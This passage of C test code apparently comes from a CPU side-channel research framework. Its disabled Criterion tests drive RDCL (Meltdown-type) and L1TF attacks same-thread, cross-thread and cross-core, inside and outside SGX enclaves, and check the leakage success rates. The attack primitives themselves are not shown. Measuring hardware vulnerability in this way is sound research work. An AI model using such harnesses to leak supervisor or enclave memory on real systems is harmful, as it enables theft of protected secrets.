    ASSERT(!sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset));

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;
        for (i = 0; i < REPETITION_TIME; i++)
        {
            ecall_grooming(global_eid, app_filling_sequence, &app_attaking_buffer, app_clearing_sequence, &app_clearing_buffer, &app_faulting_buffer);
            flush_enclyser_buffer(&app_encoding_buffer);
            attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
            reload(&app_encoding_buffer, &app_printing_buffer);
        }
        if (!(app_printing_buffer.buffer[offset + app_attaking_buffer.value] >= 10 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(rdcl, same_thread_rdcl_sgx_is_10_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_RDCL;
    app_attack_spec.minor = ATTACK_MINOR_NO_TSX;

    app_attaking_buffer.value = 0x1;
    app_attaking_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_SUPERVISOR;
    assign_enclyser_buffer(&app_attaking_buffer);
    cripple_enclyser_buffer(&app_attaking_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_same_thread_rdcl_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_same_thread_rdcl_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_same_thread_rdcl_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_same_thread_rdcl_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_same_thread_rdcl_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_same_thread_rdcl_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region cross_thread_rdcl_nosgx_is_1_percent_effective

/**
 * @brief The victim function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_thread_rdcl_nosgx_is_1_percent_effective_victim_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME * 100; i++)
    {
        fill_lfb(app_filling_sequence, &app_attaking_buffer);
    }

    return NULL;
}

/**
 * @brief The adversary function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_thread_rdcl_nosgx_is_1_percent_effective_adversary_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME; i++)
    {
        flush_enclyser_buffer(&app_encoding_buffer);
        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
        reload(&app_encoding_buffer, &app_printing_buffer);
    }

    return NULL;
}

/**
 * @brief Test if cross_thread_rdcl_nosgx is effective with a successful rate above or equal to 1% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_cross_thread_rdcl_nosgx_is_1_percent_effective(void)
{
    int offset, allowance;
    int victim_core, adversary_core;
    pthread_t victim_thread, adversary_thread;
    cpu_set_t victim_cpuset, adversary_cpuset;

    victim_core = 1;
    adversary_core = victim_core + app_sysinfo.nr_cores;

    CPU_ZERO(&victim_cpuset);
    CPU_ZERO(&adversary_cpuset);
    CPU_SET((size_t)victim_core, &victim_cpuset);
    CPU_SET((size_t)adversary_core, &adversary_cpuset);

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;

        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_thread_rdcl_nosgx_is_1_percent_effective_victim_thread, NULL));
        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_thread_rdcl_nosgx_is_1_percent_effective_adversary_thread, NULL));

        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));

        pthread_join(adversary_thread, NULL);
        pthread_join(victim_thread, NULL);

        if (!(app_printing_buffer.buffer[offset + app_attaking_buffer.value] >= 1 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(rdcl, cross_thread_rdcl_nosgx_is_1_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_RDCL;
    app_attack_spec.minor = ATTACK_MINOR_NO_TSX;

    app_attaking_buffer.value = 0x1;
    app_attaking_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_SUPERVISOR;
    assign_enclyser_buffer(&app_attaking_buffer);
    cripple_enclyser_buffer(&app_attaking_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_cross_thread_rdcl_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_cross_thread_rdcl_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_cross_thread_rdcl_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_cross_thread_rdcl_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_cross_thread_rdcl_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_cross_thread_rdcl_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region cross_thread_rdcl_sgx_is_1_percent_effective

/**
 * @brief The victim function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_thread_rdcl_sgx_is_1_percent_effective_victim_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME * 100; i++)
    {
        ecall_grooming(global_eid, app_filling_sequence, &app_attaking_buffer, app_clearing_sequence, &app_clearing_buffer, &app_faulting_buffer);
    }

    return NULL;
}

/**
 * @brief The adversary function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_thread_rdcl_sgx_is_1_percent_effective_adversary_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME; i++)
    {
        flush_enclyser_buffer(&app_encoding_buffer);
        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
        reload(&app_encoding_buffer, &app_printing_buffer);
    }

    return NULL;
}

/**
 * @brief Test if cross_thread_rdcl_sgx is effective with a successful rate above or equal to 1% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_cross_thread_rdcl_sgx_is_1_percent_effective(void)
{
    int offset, allowance;
    int victim_core, adversary_core;
    pthread_t victim_thread, adversary_thread;
    cpu_set_t victim_cpuset, adversary_cpuset;

    victim_core = 1;
    adversary_core = victim_core + app_sysinfo.nr_cores;

    CPU_ZERO(&victim_cpuset);
    CPU_ZERO(&adversary_cpuset);
    CPU_SET((size_t)victim_core, &victim_cpuset);
    CPU_SET((size_t)adversary_core, &adversary_cpuset);

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;

        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_thread_rdcl_sgx_is_1_percent_effective_victim_thread, NULL));
        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_thread_rdcl_sgx_is_1_percent_effective_adversary_thread, NULL));

        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));

        pthread_join(adversary_thread, NULL);
        pthread_join(victim_thread, NULL);

        if (!(app_printing_buffer.buffer[offset + app_attaking_buffer.value] >= 1 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(rdcl, cross_thread_rdcl_sgx_is_1_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_RDCL;
    app_attack_spec.minor = ATTACK_MINOR_NO_TSX;

    app_attaking_buffer.value = 0x1;
    app_attaking_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_SUPERVISOR;
    assign_enclyser_buffer(&app_attaking_buffer);
    cripple_enclyser_buffer(&app_attaking_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_cross_thread_rdcl_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_cross_thread_rdcl_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_cross_thread_rdcl_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_cross_thread_rdcl_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_cross_thread_rdcl_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_cross_thread_rdcl_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region cross_thread_rdcl_nosgx_is_1_percent_effective

/**
 * @brief The victim function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_core_rdcl_nosgx_is_1_percent_effective_victim_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME * 100; i++)
    {
        fill_lfb(app_filling_sequence, &app_attaking_buffer);
    }

    return NULL;
}

/**
 * @brief The adversary function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_core_rdcl_nosgx_is_1_percent_effective_adversary_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME; i++)
    {
        flush_enclyser_buffer(&app_encoding_buffer);
        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
        reload(&app_encoding_buffer, &app_printing_buffer);
    }

    return NULL;
}

/**
 * @brief Test if cross_core_rdcl_nosgx is effective with a successful rate above or equal to 1% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_cross_core_rdcl_nosgx_is_1_percent_effective(void)
{
    int offset, allowance;
    int victim_core, adversary_core;
    pthread_t victim_thread, adversary_thread;
    cpu_set_t victim_cpuset, adversary_cpuset;

    victim_core = 1;
    adversary_core = victim_core + app_sysinfo.nr_cores - 1;

    CPU_ZERO(&victim_cpuset);
    CPU_ZERO(&adversary_cpuset);
    CPU_SET((size_t)victim_core, &victim_cpuset);
    CPU_SET((size_t)adversary_core, &adversary_cpuset);

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;

        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_core_rdcl_nosgx_is_1_percent_effective_victim_thread, NULL));
        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_core_rdcl_nosgx_is_1_percent_effective_adversary_thread, NULL));

        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));

        pthread_join(adversary_thread, NULL);
        pthread_join(victim_thread, NULL);

        if (!(app_printing_buffer.buffer[offset + app_attaking_buffer.value] >= 1 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(rdcl, cross_core_rdcl_nosgx_is_1_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_RDCL;
    app_attack_spec.minor = ATTACK_MINOR_NO_TSX;

    app_attaking_buffer.value = 0x1;
    app_attaking_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_SUPERVISOR;
    assign_enclyser_buffer(&app_attaking_buffer);
    cripple_enclyser_buffer(&app_attaking_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_cross_core_rdcl_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_cross_core_rdcl_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_cross_core_rdcl_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_cross_core_rdcl_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_cross_core_rdcl_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_cross_core_rdcl_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region cross_core_rdcl_sgx_is_1_percent_effective

/**
 * @brief The victim function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_core_rdcl_sgx_is_1_percent_effective_victim_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME * 100; i++)
    {
        ecall_grooming(global_eid, app_filling_sequence, &app_attaking_buffer, app_clearing_sequence, &app_clearing_buffer, &app_faulting_buffer);
    }

    return NULL;
}

/**
 * @brief The adversary function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_core_rdcl_sgx_is_1_percent_effective_adversary_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME; i++)
    {
        flush_enclyser_buffer(&app_encoding_buffer);
        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
        reload(&app_encoding_buffer, &app_printing_buffer);
    }

    return NULL;
}

/**
 * @brief Test if cross_core_rdcl_sgx is effective with a successful rate above or equal to 1% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_cross_core_rdcl_sgx_is_1_percent_effective(void)
{
    int offset, allowance;
    int victim_core, adversary_core;
    pthread_t victim_thread, adversary_thread;
    cpu_set_t victim_cpuset, adversary_cpuset;

    victim_core = 1;
    adversary_core = victim_core + app_sysinfo.nr_cores - 1;

    CPU_ZERO(&victim_cpuset);
    CPU_ZERO(&adversary_cpuset);
    CPU_SET((size_t)victim_core, &victim_cpuset);
    CPU_SET((size_t)adversary_core, &adversary_cpuset);

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;

        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_core_rdcl_sgx_is_1_percent_effective_victim_thread, NULL));
        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_core_rdcl_sgx_is_1_percent_effective_adversary_thread, NULL));

        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));

        pthread_join(adversary_thread, NULL);
        pthread_join(victim_thread, NULL);

        if (!(app_printing_buffer.buffer[offset + app_attaking_buffer.value] >= 1 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(rdcl, cross_core_rdcl_sgx_is_1_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_RDCL;
    app_attack_spec.minor = ATTACK_MINOR_NO_TSX;

    app_attaking_buffer.value = 0x1;
    app_attaking_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_SUPERVISOR;
    assign_enclyser_buffer(&app_attaking_buffer);
    cripple_enclyser_buffer(&app_attaking_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_cross_core_rdcl_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_cross_core_rdcl_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_cross_core_rdcl_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_cross_core_rdcl_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_cross_core_rdcl_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_cross_core_rdcl_sgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma endregion

#pragma region l1tf

TestSuite(l1tf, .init = construct_app_environment, .fini = destruct_app_environment);

#pragma region same_thread_l1tf_nosgx_is_10_percent_effective

/**
 * @brief Test if same_thread_l1tf_nosgx is effective with a successful rate above or equal to 10% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_same_thread_l1tf_nosgx_is_10_percent_effective(void)
{
    int i, offset, allowance;
    int core;
    cpu_set_t cpuset;

    core = 1;

    CPU_ZERO(&cpuset);
    CPU_SET((size_t)core, &cpuset);

    ASSERT(!sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset));

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;
        for (i = 0; i < REPETITION_TIME; i++)
        {
            fill_lfb(app_filling_sequence, &encalve_secret_buffer);
            flush_enclyser_buffer(&app_encoding_buffer);
            attack(&app_attack_spec, &encalve_secret_buffer, &app_encoding_buffer);
            reload(&app_encoding_buffer, &app_printing_buffer);
        }
        if (!(app_printing_buffer.buffer[offset + encalve_secret_buffer.value] >= 10 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(l1tf, same_thread_l1tf_nosgx_is_10_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_L1TF;
    app_attack_spec.minor = ATTACK_MINOR_STABLE;

    encalve_secret_buffer.value = 0x1;
    encalve_secret_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    encalve_secret_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
    // assign_enclyser_buffer(&encalve_secret_buffer);
    ecall_assign_secret(global_eid, &encalve_secret_buffer);
    cripple_enclyser_buffer(&encalve_secret_buffer);

    sleep(2); // IMPORTANT, BUT DON'T KNOW WHY
    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_same_thread_l1tf_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    sleep(2); // IMPORTANT, BUT DON'T KNOW WHY
    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_same_thread_l1tf_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    sleep(2); // IMPORTANT, BUT DON'T KNOW WHY
    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_same_thread_l1tf_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    sleep(2); // IMPORTANT, BUT DON'T KNOW WHY
    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_same_thread_l1tf_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    sleep(2); // IMPORTANT, BUT DON'T KNOW WHY
    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_same_thread_l1tf_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    sleep(2); // IMPORTANT, BUT DON'T KNOW WHY
    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_same_thread_l1tf_nosgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region same_thread_l1tf_sgx_is_10_percent_effective // FIXME

/**
 * @brief Test if same_thread_l1tf_sgx is effective with a successful rate above or equal to 10% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_same_thread_l1tf_sgx_is_10_percent_effective(void)
{
    int i, offset, allowance;
    int core;
    cpu_set_t cpuset;

    core = 1;

    CPU_ZERO(&cpuset);
    CPU_SET((size_t)core, &cpuset);

    ASSERT(!sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset));

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;
        for (i = 0; i < REPETITION_TIME; i++)
        {
            ecall_grooming(global_eid, app_filling_sequence, &encalve_secret_buffer, app_clearing_sequence, &app_clearing_buffer, &app_faulting_buffer);
            flush_enclyser_buffer(&app_encoding_buffer);
            attack(&app_attack_spec, &encalve_secret_buffer, &app_encoding_buffer);
            reload(&app_encoding_buffer, &app_printing_buffer);
        }
        if (!(app_printing_buffer.buffer[offset + encalve_secret_buffer.value] >= 10 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(l1tf, same_thread_l1tf_sgx_is_10_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_L1TF;
    app_attack_spec.minor = ATTACK_MINOR_STABLE;

    encalve_secret_buffer.value = 0x1;
    encalve_secret_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    encalve_secret_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
    ecall_assign_secret(global_eid, &encalve_secret_buffer);
    cripple_enclyser_buffer(&encalve_secret_buffer);

    sleep(2); // IMPORTANT, BUT DON'T KNOW WHY
    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_same_thread_l1tf_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    sleep(2); // IMPORTANT, BUT DON'T KNOW WHY
    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_same_thread_l1tf_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    sleep(2); // IMPORTANT, BUT DON'T KNOW WHY
    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_same_thread_l1tf_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    sleep(2); // IMPORTANT, BUT DON'T KNOW WHY
    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_same_thread_l1tf_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    sleep(2); // IMPORTANT, BUT DON'T KNOW WHY
    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_same_thread_l1tf_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    sleep(2); // IMPORTANT, BUT DON'T KNOW WHY
    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_same_thread_l1tf_sgx_is_10_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region cross_thread_l1tf_nosgx_is_1_percent_effective

/**
 * @brief The victim function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_thread_l1tf_nosgx_is_1_percent_effective_victim_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME * 100; i++)
    {
        fill_lfb(app_filling_sequence, &app_attaking_buffer);
    }

    return NULL;
}

/**
 * @brief The adversary function run by pthread
 *
 * @param arg data passed to the thread function
 * @return void* always return NULL
 */
void *test_core_cross_thread_l1tf_nosgx_is_1_percent_effective_adversary_thread(void *arg)
{
    int i;

    (void) arg; /** bypass the warning about unsed parameter */

    for (i = 0; i < REPETITION_TIME; i++)
    {
        flush_enclyser_buffer(&app_encoding_buffer);
        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
        reload(&app_encoding_buffer, &app_printing_buffer);
    }

    return NULL;
}

/**
 * @brief Test if cross_thread_l1tf_nosgx is effective with a successful rate above or equal to 1% for at least 75% offset.
 *
 * @return int 0 if passed, -1 if failed.
 */
int test_core_cross_thread_l1tf_nosgx_is_1_percent_effective(void)
{
    int offset, allowance;
    int victim_core, adversary_core;
    pthread_t victim_thread, adversary_thread;
    cpu_set_t victim_cpuset, adversary_cpuset;

    victim_core = 1;
    adversary_core = victim_core + app_sysinfo.nr_cores;

    CPU_ZERO(&victim_cpuset);
    CPU_ZERO(&adversary_cpuset);
    CPU_SET((size_t)victim_core, &victim_cpuset);
    CPU_SET((size_t)adversary_core, &adversary_cpuset);

    allowance = 16;
    for (offset = 0; offset < 64; offset++)
    {
        app_attack_spec.offset = offset;

        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_thread_l1tf_nosgx_is_1_percent_effective_victim_thread, NULL));
        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_thread_l1tf_nosgx_is_1_percent_effective_adversary_thread, NULL));

        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));

        pthread_join(adversary_thread, NULL);
        pthread_join(victim_thread, NULL);

        if (!(app_printing_buffer.buffer[offset + app_attaking_buffer.value] >= 1 || allowance--))
        {
            // INFO("offset: 0x%x", offset);
            // print(&app_printing_buffer, 0);
            return -1;
        }
        reset(&app_printing_buffer);
    }
    return 0;
}

Test(l1tf, cross_thread_l1tf_nosgx_is_1_percent_effective, .disabled = true)
{
    app_attack_spec.major = ATTACK_MAJOR_L1TF;
    app_attack_spec.minor = ATTACK_MINOR_STABLE;

    app_attaking_buffer.value = 0x1;
    app_attaking_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
    app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
    assign_enclyser_buffer(&app_attaking_buffer);
    cripple_enclyser_buffer(&app_attaking_buffer);

    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
    cr_expect(test_core_cross_thread_l1tf_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
    cr_expect(test_core_cross_thread_l1tf_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_GP_STORE");

    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
    cr_expect(test_core_cross_thread_l1tf_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
    cr_expect(test_core_cross_thread_l1tf_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_NT_STORE");

    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
    cr_expect(test_core_cross_thread_l1tf_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");

    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
    cr_expect(test_core_cross_thread_l1tf_nosgx_is_1_percent_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
}

#pragma endregion

#pragma region cross_thread_l1tf_sgx_is_1_percent_effective // FIXME

/**
 * @brief The victim function run by pthread
 *
 * @param arg data passed to the thread function
